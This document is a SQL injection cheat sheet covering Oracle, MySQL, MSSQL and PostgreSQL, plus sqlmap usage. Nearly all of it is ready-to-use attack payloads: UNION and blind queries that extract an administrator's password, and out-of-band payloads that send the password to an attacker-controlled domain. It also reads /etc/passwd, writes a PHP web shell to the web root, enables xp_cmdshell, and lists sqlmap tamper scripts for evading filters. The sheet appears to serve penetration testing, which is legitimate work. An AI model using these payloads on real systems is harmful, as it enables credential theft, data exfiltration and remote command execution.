Note: Remember, GET request parameters might need values encoding and spaces replaced with '+'.

# All Databases
## UNION
For UNION queries you need to return the same amount of data points as in the original query. This can be determined by selecting NULL values until an expected result is returned. EG: `UNION SELECT NULL,NULL--` for 2 columns and `UNION SELECT NULL,NULL,NULL--` for 3 columns.

On Oracle, a table should be specified, so use Dual for this (default Oracle table) `UNION SELECT NULL,NULL FROM DUAL--```

By using the above method, you can then identify the data type of the different columns by entering string or numerical values EG:
`UNION SELECT NULL,'a',NULL`
`UNION SELECT NULL,1,'a',NULL`
`UNION SELECT 1,2,3,4,5 #`

Columns can be merged together if data needs to be extracted which exceeds the allowed column amount. In the below example, the second column allows string values and will have ':' separating the values.
`'+UNION+SELECT+NULL,column1||+':'+||+column2+FROM+users--`
## Blind

If there's an error, you need to infer the data based upon a boolean response. EG: if a website returns a slightly different response based upon 1=1, then you need to include a true statement among the request. EG `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a` will return true as 'a=a', so longs as the rest of the statement is also true.

Check if MSSQL server user is running as sysadmin:
`' AND IS_SRVROLEMEMBER('sysadmin')=1;--`

Check if database column has greater than 1 character
`SELECT 'a' FROM users where username='administrator' AND LENGTH(password)>1)`

From there, Burp can be useful for enumerating the actual value. In the below instance, the unknown password is being enumerated from the 'users' table for the known user 'administrator'. Iterating through the 'a' character on the far right will change the truthy statement to false in the event that the value is incorrect.
`' AND (SELECT SUBSTRING(db_name(),1,1))='a `
`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
Following this, iterate to the next part of the string by changing the substring value.
`' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`

Sometimes commands need to be concatenated between existing statements on the server. This can be achieved by using `'||(select password from users where password like '%')||'`

In cases where data types are different to that expected, it's possible to include a method to force the data type. This can cause an error to be displayed within the application. The below query casts the select query as an integer, with a limit of a single value returned.
`'AND 1=CAST((SELECT password from users LIMIT 1) AS int)--`

## Out-of-bounds Connections

The following payload could be used to make a request to a third-party service, with the payload being appended to the front of the domain/subdomain. Mainly this would be used with burp collaborator.
`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'DOMAIN-HERE">+%25remote%3b]>'),'/l')+FROM+dual--`

master..xp_dirtree `DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');`

master..xp_fileexist `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');`

master..xp_subdirs `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');`

sys.dm_os_file_exists `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');`

fn_trace_gettable `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);`

fn_get_audit_file `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);`

### Oracle 
By presenting a truthy statement in the below query (1=1), you can determine whether a value is true within the database.
`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
For example, using the following to determine password length in the users table:
`'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
Enumerating the value of the column name can be achieved using the below query, changing the value of the SUBSTR and it's place to iterate the full values
`'||(SELECT CASE WHEN SUBSTR(password,1,1)='§b§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
# Oracle
Note: Oracle databases need .sys before table names. EG: `sys.users` or `sys.passwords`

Show the db version
`select * from v$version;`
`UNION SELECT banner,NULL FROM v$version --`

Show the db user
`SELECT * FROM user_users;`
`SELECT * FROM all_users ORDER BY created;`

Show available databases - does it by searching through the different user's access
`select owner from all_tables group by owner;`

Show available tables in a database
`SELECT owner, TABLENAME FROM all_tables;`

Show values in a specific table
`select * from TABLENAME;`

UNION query to show all tables and columns in the database
`UNION ALL SELECT table_name,column_name FROM all_tab_columns--`

For identifying blind injection:
`BEGIN DBMS_LOCK.SLEEP(15); END;`
`dbms_pipe.receive_message(('a'),10)`

# MySQL
Select the DB version
`select version();`
` UNION SELECT @@VERSION, NULL#`
` UNION SELECT VERSION(), NULL #`

Select the DB user
`select current_user();`

Show available databases
`select table_schema from information_schema.tables group by table_schema; show databases;`

Show available tables in a database
`select table_name from information_schema.tables where table_schema = 'DATABASENAME';`

Show columns in a specific table
`select column_name, data_type from information_schema.columns where table_schema = 'DATABASENAME' and table_name = 'TABLENAME';`

Useful command for causing errors
`extractvalue('',concat('>',version()))`

UNION query to show all tables and columns in the database
`UNION ALL SELECT table_name,column_name FROM INFORMATION_SCHEMA.COLUMNS--`

For identifying blind injection:
`SLEEP(x)`, EG: `SLEEP(5)` sleeps for 5 seconds

Count columns in table
`SELECT count(*) AS NUMBEROFCOLUMNS FROM information_schema.columns WHERE table_name='INSERT-TABLE-NAME-HERE';`

Load Files
`SELECT LOAD_FILE('/etc/passwd')`
`LOAD_FILE("/var/www/html/file.php")`

Write to Files
`SELECT 'example of file content' INTO OUTFILE '/tmp/test.txt'`
`SELECT * FROM tablename INTO OUTFILE '/tmp/test.txt'`
Below writes a shell file to the environment, should be accessible on the `/shell.php` directory. Commands are passed through the 0 variable. EG: `/shell.php?0=whoami`
`SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php'`
# MSSQL
Note: `sa` is the default admin account

Show the db version
`select @@version;`
` UNION SELECT @@VERSION, NULL#`

Show the db user
`SELECT SYSTEM_USER;`

Show available databases
`SELECT name FROM sys.databases;`

Show available tables in a database
`select * from DATABASENAME.information_schema.tables;`

Show values in a specific table
`select COLUMN_NAME, DATA_TYPE from DATABASENAME.information_schema.columns where TABLE_NAME = 'TABLENAME';`

Select database values
`select * from DATABASENAME.dbo.TABLENAME`

Useful command for causing errors
`cast(@@version as integer)`

For identifying blind injection:
`WAIT FOR DELAY 'hh:mm:ss'`
`WAIT FOR TIME 'hh:mm:ss'`

To count columns
`SELECT COUNT(*) FROM TABLE_NAME`

IF true, delay
`IF (1=1) WAITFOR DELAY '0:0:10';--`

## Microsoft Shell
Step 1 - Enable the advanced options:
`;exec sp_configure 'show advanced options','1';reconfigure;--

Step 2 - Enable commandshell
`;exec sp_configure 'xp_cmdshell','1';reconfigure;--`


# PostgreSQL
Show the db version
`select version();`

Show the db user
`select current_user;`

Show available databases
`select datname from pg_database;`

Show available tables in a database
`select table_name from DATABASENAME.information_schema.tables where table_schema = 'public';`

Show values in a specific table
`select * from TABLENAME;`

For identifying blind injection:
`SELECT pg_sleep(10)`

If statement
`SELECT CASE WHEN _condition_ THEN _true-part_ ELSE _false-part_ END; (P)`
`SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;`

Time-based enumeration
The below can be used to check for time-based enumeration
`'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

The below can be used to identify if the 'administrator' username exists within the 'users' table
`'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

The below LIKE statement allows for the identification of passwords associated with the administrator username. The %25 is the encoded value for %, which acts as a wildcard within that statement. Using 'a%' checks whether the value begins with the letter 'a'.
`%3BSELECT+CASE+WHEN+(password LIKE '%25')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users WHERE username='administrator'--`

# SQLMAP

To throw the kitchen sink at an injection point, use:
`sqlmap -u "http://TARGET-URL-HERE?id=*" --level=5 --risk=3 --technique=BEUSTQ --random-agent`
- **Level** - increases the testing performed
- **Risk** - attempts SQLi which could interrupt the service
- **Technique** - enforces the different injection techniques (Blind, Error, Union, Stacked, Time-Based, Inline Queries)

`-p [PARAMETER]` can be used to enforce the parameter to target
## Prefix/Suffix
Can be useful if you can deduce what the backend query may look like:
`--prefix="%60"`
`--prefix="%'))" --suffix="-- -"`
`--prefix=")))"`
## Tamper Scripts

MySQL`tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor`

MSSQL`tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes`

General`tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes`